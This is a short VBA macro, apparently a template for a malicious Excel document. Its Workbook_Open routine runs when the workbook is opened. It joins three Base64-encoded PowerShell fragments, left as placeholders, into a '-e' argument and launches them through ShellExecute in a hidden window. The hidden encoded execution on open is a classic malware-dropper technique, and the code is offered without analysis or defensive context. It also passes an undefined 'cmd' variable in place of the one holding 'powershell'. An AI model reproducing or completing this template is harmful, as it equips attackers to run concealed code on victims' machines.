#If VBA7 Then
    Private Declare PtrSafe Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
        ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, _
        ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
#Else
    Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
        ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, _
        ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
#End If

Sub Workbook_Open()
    Dim ps As String, arg As String, arg1 As String, arg2 As String, arg3 As String
    ps = "powershell"
    arg1 = " -e <UTF-16LE & Base64 Encoded part1>"
    arg2 = "<UTF-16LE & Base64 Encoded part2>"
    arg3 = "<UTF-16LE & Base64 Encoded part3>"
    arg = arg1 & arg2 & arg3

    ShellExecute 0, "open", cmd, arg, "", 0
End Sub